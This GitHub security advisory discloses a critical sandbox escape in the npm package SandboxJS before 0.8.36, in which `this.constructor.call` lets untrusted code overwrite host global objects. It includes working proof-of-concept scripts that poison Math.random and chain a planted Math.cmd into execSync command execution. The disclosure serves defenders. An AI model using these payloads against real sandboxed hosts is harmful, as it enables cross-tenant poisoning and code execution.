# [C] SandboxJS: Sandbox integrity escape 

## Summary
Severity: Critical
Advisory: GHSA-2gg9-6p7w-6cpj
CVE: CVE-2026-34208
CWE: CWE-693, CWE-915
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L (CVSS_V3)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-2gg9-6p7w-6cpj
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.36

## Details
### Summary
SandboxJS blocks direct assignment to global objects (for example `Math.random = ...`), but this protection can be bypassed through an exposed callable constructor path: `this.constructor.call(target, attackerObject)`. Because `this.constructor` resolves to the internal `SandboxGlobal` function and `Function.prototype.call` is allowed, attacker code can write arbitrary properties into host global objects and persist those mutations across sandbox instances in the same process.

### Details
The intended safety model relies on write-time checks in assignment operations. In `assignCheck`, writes are denied when the destination is marked global (`obj.isGlobal`), which correctly blocks straightforward payloads like `Math.random = () => 1`.

Reference: [`src/executor.ts#L215-L218`](https://github.com/nyariv/SandboxJS/blob/cc8f20b4928afed5478d5ad3d1737ef2dcfaac29/src/executor.ts#L215-L218)

```ts
if (obj.isGlobal) {
  throw new SandboxAccessError(
    `Cannot ${op} property '${obj.prop.toString()}' of a global object`,
  );
}
```

The bypass works because the dangerous write is not performed by an assignment opcode. Instead, attacker code reaches a host callable that performs writes internally. The constructor used for sandbox global objects is `SandboxGlobal`, implemented as a function that copies all keys from a provided object into `this`.

Reference: [`src/utils.ts#L84-L88`](https://github.com/nyariv/SandboxJS/blob/cc8f20b4928afed5478d5ad3d1737ef2dcfaac29/src/utils.ts#L84-L88)

```ts
export const SandboxGlobal = function SandboxGlobal(this: ISandboxGlobal, globals: IGlobals) {
  for (const i in globals) {
    this[i] = globals[i];
  }
} as any as SandboxGlobalConstructor;
```

At runtime, global scope `this` is a `SandboxGlobal` instance (`functionThis`), so `this.constructor` resolves to `SandboxGlobal`. That constructor is reachable from sandbox code, and calls through `Function.prototype.call` are allowed by the generic call opcode path.

References:
- [`src/utils.ts#L118-L126`](https://github.com/nyariv/SandboxJS/blob/cc8f20b4928afed5478d5ad3d1737ef2dcfaac29/src/utils.ts#L118-L126)
- [`src/executor.ts#L493-L518`](https://github.com/nyariv/SandboxJS/blob/cc8f20b4928afed5478d5ad3d1737ef2dcfaac29/src/executor.ts#L493-L518)

```ts
const sandboxGlobal = new SandboxGlobal(options.globals);
...
globalScope: new Scope(null, options.globals, sandboxGlobal),
```

```ts
const evl = context.evals.get(obj.context[obj.prop] as any);
let ret = evl ? evl(obj.context[obj.prop], ...vals) : (obj.context[obj.prop](...vals) as unknown);
```

This creates a privilege gap:
1. Direct global mutation is blocked in assignment logic.
2. A callable host function that performs arbitrary property writes is still reachable.
3. The call path does not enforce equivalent global-mutation restrictions.
4. Attacker-controlled code can choose the write target (`Math`, `JSON`, etc.) via `.call(target, payloadObject)`.

In practice, the payload:
```js
const SG = this.constructor;
SG.call(Math, { random: () => 'pwned' });
```
overwrites host `Math.random` successfully. The mutation is visible immediately in host runtime and in fresh sandbox instances, proving cross-context persistence and sandbox boundary break.

### PoC
Install dependency:

```bash
npm i @nyariv/sandboxjs@0.8.35
```

#### Global write bypass with `pwned` marker

```js
#!/usr/bin/env node
'use strict';

const Sandbox = require('@nyariv/sandboxjs').default;
const run = (code) => new Sandbox().compile(code)().run();
const original = Math.random;

try {
  try {
    run('Math.random = () => 1');
    console.log('Without bypass (direct assignment): unexpectedly succeeded');
  } catch (err) {
    console.log('Without bypass (direct assignment): blocked ->', err.message);
  }
  run(`this.constructor.call(Math, { random: () => 'pwned' })`);
  console.log('With bypass (host Math.random()):', Math.random());
  console.log('With bypass (fresh sandbox Math.random()):', run('return Math.random()'));
} finally {
  Math.random = original;
}
```

Expected output:

```
Without bypass (direct assignment): blocked -> Cannot assign property 'random' of a global object
With bypass (host Math.random()): pwned
With bypass (fresh sandbox Math.random()): pwned
```

`With bypass (host Math.random())` proves the sandbox changed host runtime state immediately.  
`With bypass (fresh sandbox Math.random())` proves the mutation persists across new sandbox instances, which shows cross-execution contamination.

#### Command `id` execution via host gadget

This second PoC demonstrates exploitability when host code later uses a mutated global property in a sensitive sink. It uses the POSIX `id` command as a harmless execution marker.

```js
#!/usr/bin/env node
'use strict';

const Sandbox = require('@nyariv/sandboxjs').default;
const { execSync } = require('child_process');

const run = (code) => new Sandbox().compile(code)().run();
const hadCmd = Object.prototype.hasOwnProperty.call(Math, 'cmd');
const originalCmd = Math.cmd;

try {
  try {
    run(`Math.cmd = 'id'`);
    console.log('Without bypass (direct assignment): unexpectedly succeeded');
  } catch (err) {
    console.log('Without bypass (direct assignment): blocked ->', err.message);
  }
  run(`this.constructor.call(Math, { cmd: 'id' })`);
  console.log('With bypass (host command source Math.cmd):', Math.cmd);
  console.log(
    'With bypass + host gadget execSync(Math.cmd):',
    execSync(Math.cmd, { encoding: 'utf8' }).trim(),
  );
} finally {
  if (hadCmd) {
    Math.cmd = originalCmd;
  } else {
    delete Math.cmd;
  }
}
```

Expected output:

```
Without bypass (direct assignment): blocked -> Cannot assign property 'cmd' of a global object
With bypass (host command source Math.cmd): id
With bypass + host gadget execSync(Math.cmd): uid=1000(mk0) gid=1000(mk0) groups=1000(mk0),...
```

### Impact
This is a sandbox integrity escape. Untrusted code can mutate host shared global objects despite explicit global-write protections. Because these mutations persist process-wide, exploitation can poison behavior for other requests, tenants, or subsequent sandbox runs. Depending on host application usage of mutated built-ins, this can be chained into broader compromise, including control-flow hijack in application logic that assumes trusted built-in behavior.

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-2gg9-6p7w-6cpj
- https://nvd.nist.gov/vuln/detail/CVE-2026-34208
- https://github.com/nyariv/SandboxJS
